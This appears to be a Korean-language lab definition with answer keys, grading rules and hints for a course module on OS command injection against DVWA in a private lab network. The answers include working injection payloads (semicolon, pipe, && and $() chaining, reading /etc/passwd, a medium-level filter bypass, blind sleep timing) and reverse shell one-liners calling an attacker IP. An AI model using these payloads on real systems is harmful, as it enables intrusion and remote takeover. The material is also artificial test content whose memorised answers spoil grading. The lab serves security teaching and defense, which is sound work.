lab_id: web-vuln-nonai-week10
title: Command Injection 실습
version: non-ai
course: web-vuln-nonai
week: 10
description: DVWA와 JuiceShop 환경에서 OS 명령어 주입 취약점을 탐지하고, 다양한 메타문자와 우회 기법으로 공격합니다.
difficulty: medium
duration_minutes: 120
objectives:
- OS 명령어 주입의 원리와 다양한 구분자를 이해한다
- Blind Command Injection 탐지 기법을 학습한다
- 필터 우회 기법과 방어 방법을 실습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: DVWA(:8080)에 로그인하고 Command Injection 페이지에 정상적인 ping 요청을 보내 기능을 확인하시오.
  hint: 먼저 로그인하여 세션 쿠키를 획득한 후, /vulnerabilities/exec/ 페이지에 ip=127.0.0.1 파라미터를 POST로 전송하세요.
  category: recon
  points: 8
  answer: "curl -s -c /tmp/dvwa_cmd.txt \\\n  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php\
    \ -L > /dev/null && curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\n  -d 'ip=127.0.0.1&Submit=Submit'\
    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -oE 'PING|bytes from|ttl=' | head -5"
  answer_detail: DVWA의 Command Injection 페이지는 사용자 입력을 shell_exec('ping -c 4 '.$target)으로 전달합니다. security=low에서는
    입력 필터링이 없어 모든 명령어 구분자를 사용할 수 있습니다.
  verify:
    type: output_contains
    expect: PING
    field: stdout
    semantic:
      intent: DVWA 로그인 + 정상 ping — /vulnerabilities/exec/ ip=127.0.0.1. shell_exec('ping -c 4 '.$target)
        패턴. security=low 필터 없음. CWE-78 OS Command Injection.
      success_criteria:
      - PING 키워드
      - 로그인 후 ping 실행
      - DVWA 8080 경로
      acceptable_methods:
      - curl -c/-b 세션 + POST
      - Burp Repeater
      - Selenium auto
      negative_signs:
      - 로그인 없음
      - ping 실행 안됨
      - 쿠키 미사용
  target_vm: attacker
- order: 2
  instruction: 세미콜론(;)을 이용한 명령어 주입을 수행하시오. 127.0.0.1 뒤에 세미콜론으로 id 명령을 연결하라.
  hint: curl -d 'ip=127.0.0.1;+id&Submit=Submit' 형태로 POST하세요. security=low 쿠키 필요.
  category: exploit
  points: 12
  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\n  -d 'ip=127.0.0.1;+id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
    \ \\\n | grep -oP 'uid=\\d+\\([^)]+\\)'"
  answer_detail: 세미콜론(;)은 리눅스에서 명령어를 순차적으로 실행합니다. 앞의 ping 명령과 관계없이 id 명령이 실행됩니다. uid=33(www-data)가 출력되면
    웹 서버 프로세스 권한으로 명령이 실행된 것입니다.
  verify:
    type: output_contains
    expect: uid=
    field: stdout
    semantic:
      intent: 세미콜론 주입 — ip=127.0.0.1;+id. ; = 순차 실행. id 결과 uid=33(www-data) 출력. CWE-78 + OWASP A03. Linux
        shell metacharacter.
      success_criteria:
      - uid= 키워드
      - 세미콜론 (;) 주입
      - id 명령 실행
      acceptable_methods:
      - ; 세미콜론
      - '&& AND'
      - '|| OR'
      negative_signs:
      - ; 없음
      - id 실행 안됨
      - 단순 ping
  target_vm: attacker
- order: 3
  instruction: 파이프(|)를 이용한 명령어 주입을 수행하시오. cat /etc/passwd로 시스템 사용자 목록을 확인하라.
  hint: ip 파라미터에 '| cat /etc/passwd'를 넣으세요. 파이프 앞의 명령 없이 단독으로 뒤 명령만 실행됩니다.
  category: exploit
  points: 12
  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\n  -d 'ip=|+cat+/etc/passwd&Submit=Submit'\
    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -E 'root|www-data|sshd' | head -5"
  answer_detail: 파이프(|)는 앞 명령의 출력을 뒤 명령의 입력으로 전달합니다. 단독으로 사용하면 앞 명령 없이 뒤 명령만 실행됩니다. root:x:0:0이 출력되면 /etc/passwd
    읽기에 성공한 것입니다.
  verify:
    type: output_contains
    expect: root
    field: stdout
    semantic:
      intent: 파이프 주입 — ip=|+cat+/etc/passwd. | = 앞 명령 출력을 뒤 명령 입력. 단독 사용 시 뒤 명령만 실행. root:x:0:0 출력. CWE-78.
      success_criteria:
      - root 키워드
      - 파이프 (|) 주입
      - /etc/passwd 읽기
      acceptable_methods:
      - '| 파이프'
      - ; cat 결합
      - $() 명령 치환
      negative_signs:
      - '| 없음'
      - 단순 ping
      - /etc/passwd 누락
  target_vm: attacker
- order: 4
  instruction: AND(&&) 연산자를 이용한 명령어 주입을 수행하시오. ping이 성공한 후 whoami와 네트워크 정보를 확인하라.
  hint: ip 파라미터에 '127.0.0.1 && whoami'를 넣으세요. &&는 URL 인코딩(%26%26)이 필요합니다.
  category: exploit
  points: 10
  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\n  -d 'ip=127.0.0.1+%26%26+whoami+%26%26+ip+addr+show+eth0&Submit=Submit'\
    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -E 'www-data|inet ' | head -5"
  answer_detail: '&&(AND)는 첫 번째 명령이 성공(exit code 0)해야 두 번째 명령이 실행됩니다. &는 URL에서 파라미터 구분자이므로 %26으로 인코딩해야
    합니다. www-data와 IP 주소가 출력되면 성공입니다.'
  verify:
    type: output_contains
    expect: www-data
    field: stdout
    semantic:
      intent: AND(&&) 주입 — ip=127.0.0.1+%26%26+whoami+%26%26+ip+addr. && = 첫 명령 성공 시 다음 실행. & URL 인코딩
        %26. www-data + IP 출력. CWE-78.
      success_criteria:
      - www-data 키워드
      - '&& 또는 %26%26 URL 인코딩'
      - 다중 명령 체인
      acceptable_methods:
      - '&& AND'
      - '|| OR'
      - ; 순차
      negative_signs:
      - AND 미사용
      - URL 인코딩 없음
      - 단일 명령
  target_vm: attacker
- order: 5
  instruction: 백틱(`)과 $() 명령 치환을 이용한 명령어 주입을 수행하시오. 서버의 hostname을 확인하라.
  hint: ip 파라미터에 '127.0.0.1; echo HOSTNAME=$(cat /etc/hostname)'를 넣으세요.
  category: exploit
  points: 10
  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1; echo CMDI_HOSTNAME=$(cat\
    \ /etc/hostname)' \\\n  -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep\
    \ 'CMDI_HOSTNAME'"
  answer_detail: 백틱(`)이나 $()은 명령 치환(command substitution)으로, 내부 명령의 실행 결과가 외부 명령의 인자로 대체됩니다. 필터가 세미콜론만
    차단하는 경우 $()로 우회할 수 있습니다.
  verify:
    type: output_contains
    expect: CMDI_HOSTNAME
    field: stdout
    semantic:
      intent: 명령 치환 $() — ip=127.0.0.1; echo CMDI_HOSTNAME=$(cat /etc/hostname). 백틱 또는 $() = 명령 결과 치환.
        세미콜론만 필터 시 $() 우회. CWE-78.
      success_criteria:
      - CMDI_HOSTNAME 키워드
      - $() 명령 치환
      - hostname 출력
      acceptable_methods:
      - $() substitution
      - '`backtick`'
      - ${ } 변수 치환
      negative_signs:
      - $()/backtick 없음
      - 단순 실행
      - 치환 맥락 없음
  target_vm: attacker
- order: 6
  instruction: DVWA의 Medium 보안 레벨에서 명령어 주입 필터를 우회하시오. Medium에서는 &&와 ;가 필터링되지만 파이프(|)는 허용된다.
  hint: security=medium 쿠키를 사용하고, 파이프(|)로 우회하세요. curl -b 'security=medium' -d 'ip=|+id&Submit=Submit'
    형태입니다.
  category: exploit
  points: 12
  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=medium' \\\n  -d 'ip=|+id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
    \ \\\n | grep -oP 'uid=\\d+\\([^)]+\\)'"
  answer_detail: Medium 레벨은 str_replace로 '&&'와 ';'만 필터링합니다. 파이프(|), OR(||), 줄바꿈(%0a), 백틱(`) 등은 여전히 사용
    가능합니다. 블랙리스트 필터링의 한계를 보여줍니다.
  verify:
    type: output_contains
    expect: uid=
    field: stdout
    semantic:
      intent: Medium 필터 우회 — security=medium + ip=|+id. && + ; 필터링되지만 | 허용. 블랙리스트 한계 (OR ||, %0a 줄바꿈,
        백틱도 허용). CWE-78 + CWE-697.
      success_criteria:
      - uid= 키워드
      - security=medium 쿠키
      - '| 파이프 우회'
      acceptable_methods:
      - '| 파이프'
      - '|| OR'
      - '%0a 줄바꿈'
      negative_signs:
      - 우회 기법 없음
      - medium 레벨 미사용
      - 블랙리스트 맥락 없음
  target_vm: attacker
- order: 7
  instruction: 시간 기반 Blind Command Injection을 테스트하시오. sleep 명령으로 응답 지연을 유발하여 명령 실행을 확인하라.
  hint: ip 파라미터에 '127.0.0.1; sleep 3'을 넣고, curl의 -w '%{time_total}'로 응답 시간을 측정하세요. 3초 이상이면 명령이 실행된 것입니다.
  category: exploit
  points: 10
  answer: 'echo ''=== Normal Request ==='' && curl -s -o /dev/null -b /tmp/dvwa_cmd.txt -b ''security=low''
    -d ''ip=127.0.0.1&Submit=Submit'' -w ''Time: %{time_total}s'' http://10.20.30.80:8080/vulnerabilities/exec/
    && echo '''' && echo ''=== Sleep Injection ==='' && curl -s -o /dev/null -b /tmp/dvwa_cmd.txt -b ''security=low''
    --data-urlencode ''ip=127.0.0.1; sleep 3'' -d ''Submit=Submit'' -w ''Time: %{time_total}s'' http://10.20.30.80:8080/vulnerabilities/exec/'
  answer_detail: Blind Command Injection은 출력이 보이지 않을 때 사용합니다. sleep으로 지연을 유발하면 응답 시간 차이로 명령 실행 여부를 판단합니다.
    정상 요청 대비 3초 이상 지연되면 주입이 성공한 것입니다.
  verify:
    type: output_contains
    expect: Sleep Injection
    field: stdout
    semantic:
      intent: Blind Command Injection — ip=127.0.0.1; sleep 3 + curl -w '%{time_total}'. 출력 없음 → 응답 지연으로
        판별. 정상 <1초 / sleep 3초+. CWE-78.
      success_criteria:
      - Sleep Injection 키워드
      - sleep 3 + time_total
      - 정상 vs 지연 비교
      acceptable_methods:
      - sleep + time_total
      - DNS OOB
      - HTTP OOB (Burp Collaborator)
      negative_signs:
      - sleep 없음
      - 시간 측정 없음
      - Blind 맥락 없음
  target_vm: attacker
- order: 8
  instruction: 리버스 쉘 페이로드를 작성하시오(실행 금지). {{ATTACKER_IP}}(공격자 VM)로 연결하는 bash 리버스 쉘 명령을 /tmp/revshell_payload.txt에
    저장만 하라.
  hint: bash -i >& /dev/tcp/{{ATTACKER_IP}}/4444 0>&1 형태의 리버스 쉘 페이로드입니다.
  category: exploit
  points: 8
  answer: 'cat > /tmp/revshell_payload.txt << ''SHELLEOF''

    === Reverse Shell Payloads (학습 목적 - 실행 금지) ===

    bash -i >& /dev/tcp/10.20.30.201/4444 0>&1

    python3 -c ''import socket,subprocess,os;s=socket.socket();s.connect(("10.20.30.201",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])''

    nc -e /bin/bash 10.20.30.201 4444

    SHELLEOF

    echo ''Reverse shell payloads saved to /tmp/revshell_payload.txt'' && cat /tmp/revshell_payload.txt'
  answer_detail: 리버스 쉘은 대상 서버가 공격자에게 쉘 연결을 역으로 맺는 기법입니다. bash -i는 대화형 쉘, >& /dev/tcp/IP/PORT는 TCP 소켓 리다이렉션,
    0>&1은 stdin을 stdout으로 리다이렉션합니다. 방화벽이 인바운드를 차단해도 아웃바운드로 우회 가능합니다.
  verify:
    type: output_contains
    expect: Reverse shell payloads saved
    field: stdout
    semantic:
      intent: 리버스 쉘 페이로드 — bash -i >& /dev/tcp/10.20.30.201/4444 0>&1 + python3 -c socket + nc -e. 방화벽
        인바운드 차단 우회. 3가지 변형. MITRE T1059. CWE-78.
      success_criteria:
      - Reverse shell payloads saved 키워드
      - bash + python + nc 3종
      - /dev/tcp 또는 소켓
      acceptable_methods:
      - bash /dev/tcp
      - python socket
      - nc -e / ncat --ssl
      negative_signs:
      - 페이로드 1개 이하
      - 실행 (학습 목적 위반)
      - 방화벽 우회 맥락 없음
  target_vm: attacker
- order: 9
  instruction: ModSecurity WAF가 명령어 주입을 차단하는지 검증하시오. 포트 80(WAF 적용)에 명령어 주입 페이로드를 보내고, 포트 8080(DVWA 직접)과
    비교하라.
  hint: 같은 '; id' 페이로드를 포트 80과 포트 8080에 각각 전송하여 응답 코드(200 vs 403)를 비교하세요.
  category: defense
  points: 10
  answer: echo '=== DVWA Direct (포트 8080) ===' && curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' -d 'ip=127.0.0.1;+id&Submit=Submit'
    http://10.20.30.80:8080/vulnerabilities/exec/ | grep -oP 'uid=[^ ]+' | head -1 && echo '=== ModSecurity
    WAF (포트 80) ===' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?cmd=;id' &&
    echo '' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?input=127.0.0.1%7Ccat%20/etc/passwd'
  answer_detail: ModSecurity OWASP CRS의 REQUEST-932 시리즈는 OS 명령어 패턴(;, |, &&와 id, cat, whoami 등의 조합)을 탐지합니다.
    WAF가 적용된 포트 80에서는 403이 반환되고, 직접 접근 시에는 명령이 실행됩니다. 다층 방어(WAF + 입력 검증 + escapeshellcmd())가 필요합니다.
  verify:
    type: output_contains
    expect: ModSecurity WAF
    field: stdout
    semantic:
      intent: WAF 차단 비교 — 포트 8080 직접 vs 포트 80 ModSecurity. ModSecurity CRS 932xxx = OS Command 패턴 (;/|/&&/id/cat/whoami).
        403 vs 200. 다층 방어. CWE-78.
      success_criteria:
      - ModSecurity WAF 키워드
      - 8080 vs 80 비교
      - 403 또는 200 응답
      acceptable_methods:
      - 두 포트 curl 비교
      - Burp 두 엔드포인트
      - OWASP CRS 932 룰
      negative_signs:
      - 비교 없음
      - WAF 맥락 없음
      - 단일 포트
  target_vm: attacker
- order: 10
  instruction: 명령 주입 진단 결과를 정리하시오. 테스트한 메타문자, 성공/실패 여부, 필터 우회 결과, WAF 차단 여부를 보고서로 작성하라.
  hint: echo 명령으로 /tmp/cmdi_report.txt에 구조화된 보고서를 작성하세요.
  category: reporting
  points: 8
  answer: "cat > /tmp/cmdi_report.txt << 'EOF'\n=== 명령 주입 취약점 진단 보고서 ===\n대상: DVWA (10.20.30.80:8080)\n\
    \n[메타문자 테스트 결과]\n  ; (세미콜론)  : Low 성공, Medium 필터링\n  | (파이프)    : Low/Medium 모두 성공\n  && (AND)   \
    \   : Low 성공, Medium 필터링\n  $() (치환)    : Low 성공\n  sleep (Blind) : Low 성공 (3초 지연)\n\n[WAF 차단 결과]\n\
    \  ModSecurity (포트 80): 932xxx 룰로 차단 (403)\n  직접 접근 (포트 8080): 차단 없음\n\n[방어 권고]\n  1. escapeshellcmd()/escapeshellarg()\
    \ 적용\n  2. 입력값 화이트리스트 (IP 형식만 허용)\n  3. shell_exec() 대신 안전한 API 사용\n  4. WAF 룰 전 포트에 적용\nEOF\ncat\
    \ /tmp/cmdi_report.txt"
  answer_detail: 명령 주입 방어의 핵심은 사용자 입력을 OS 명령에 직접 전달하지 않는 것입니다. 불가피한 경우 escapeshellcmd()/escapeshellarg()
    사용, 화이트리스트 검증, WAF 적용이 필요합니다.
  verify:
    type: output_contains
    expect: 명령 주입 취약점 진단 보고서
    field: stdout
    semantic:
      intent: Command Injection 보고서 — 메타문자 5종 (;/|/&&/$()/sleep) + WAF 차단 + 방어(escapeshellcmd/화이트리스트/shell_exec
